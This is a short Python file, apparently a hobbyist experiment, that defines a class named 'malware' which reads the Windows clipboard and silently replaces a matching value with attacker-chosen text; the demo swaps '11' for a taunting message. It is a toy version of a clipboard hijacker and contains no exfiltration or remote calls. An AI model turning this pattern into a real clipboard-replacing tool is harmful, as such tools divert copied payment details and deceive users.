import win32clipboard as Clip
import time

#Note: will need to install win32clipboard onto the machine for this to work
class malware:

	#just my initial testing of the functions
	def docs():

		Clip.OpenClipboard()
		#gets the clipboard data
		data = Clip.GetClipboardData()

		#clears the keyboard
		Clip.EmptyClipboard()
		Clip.SetClipboardText("Luke, I am your father")
		Clip.CloseClipboard()
		print("hello world")
		#https://stackoverflow.com/questions/101128/how-do-i-read-text-from-the-windows-clipboard-from-python
		return 0
		
	
	def mal(value,change):
		"""
		param: value-- will check for this value on the clipboard
		param: change-- will change the clipboard to this value
		"""
		Clip.OpenClipboard() #opens the clipboard
		data = str(Clip.GetClipboardData())
		Clip.CloseClipboard()
		if(data == value):	#checking for a particular value
			Clip.OpenClipboard()
			Clip.EmptyClipboard() #empties the clipboard
			print (data)
			Clip.SetClipboardText(change) #inserts the text onto the clipboard
		
			print (data)
			
			Clip.CloseClipboard()
			return 1 #if successful
		return 0 #if failure
		
def main():
	#clears the keyboard
	malware.mal("11","You just got hacked son!")
main()

